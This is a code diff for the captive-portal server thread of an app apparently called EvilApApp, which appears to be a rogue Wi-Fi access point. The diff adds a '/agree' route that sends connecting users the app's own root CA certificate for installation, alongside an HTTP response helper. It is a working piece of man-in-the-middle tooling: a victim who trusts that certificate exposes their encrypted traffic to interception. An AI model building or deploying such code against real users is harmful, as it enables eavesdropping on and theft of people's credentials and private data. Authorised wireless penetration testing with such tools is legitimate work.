@@ -22,17 +22,27 @@ internal class ThreadCaptivePortal(private val sClient: Socket) : Runnable {
             inData = BufferedReader(InputStreamReader(sClient.getInputStream()))
             outStream = sClient.getOutputStream()
 
-            val reqFile = readRequestedFile(inData) ?: return
+            val reqFile = getRequestedFile(inData)
+            if (reqFile == null) {
+                Log.e(TAG, "Cannot read request, closing")
+                return
+            }
             when(reqFile) {
                 "/" -> {
-                    outStream.write(EvilApApp.instance.indexFile)
+                    sendResponse(outStream, "text/html; charset=utf-8", 200,
+                            EvilApApp.instance.indexFile)
+                }
+                "/agree" -> {
+                    sendResponse(outStream, "application/x-x509-ca-cert", 200,
+                            EvilApApp.instance.ca.print(EvilApApp.instance.ca.root).toByteArray())
                 }
                 else -> {
-                    outStream.write(EvilApApp.instance.notFoundFile)
+                    sendResponse(outStream, "text/html; charset=utf-8", 404,
+                            EvilApApp.instance.notFoundFile)
                 }
             }
             outStream.flush()
-            Log.d(TAG, "[SEND]")
+            Log.d(TAG, "[RESPONSE SEND]")
         } catch (e: IOException) {
             if (e is SocketTimeoutException)
                 Log.e(TAG, "TIMEOUT!")
@@ -50,9 +60,23 @@ internal class ThreadCaptivePortal(private val sClient: Socket) : Runnable {
         }
     }
 
-    private fun readRequestedFile(inR: BufferedReader): String?{
+    private fun sendResponse(out: OutputStream, mime: String, code: Int, body: ByteArray){
+        when (code) {
+            200 -> { out.write("HTTP/1.1 200 OK\r\n".toByteArray()) }
+            404 -> { out.write("HTTP/1.1 404 Not Found\r\n".toByteArray()) }
+        }
+        out.write("Connection: close\r\n".toByteArray())
+        out.write("Content-Type: $mime\r\n".toByteArray())
+        if("cert" in mime){
+            out.write("Content-Disposition: inline; filename=ca-cert.pem\r\n".toByteArray())
+        }
+        out.write("Content-Length: ${body.size}\r\n\r\n".toByteArray())
+        out.write(body)
+    }
+
+    private fun getRequestedFile(inR: BufferedReader): String?{
         val requestLine = inR.readLine() ?: return null
-        Log.d("$TAG[REQUEST LINE]", requestLine)
+        Log.d(TAG,"[REQUEST LINE] $requestLine")
         val requestLineValues = requestLine.split("\\s+".toRegex())
 
         var line: String
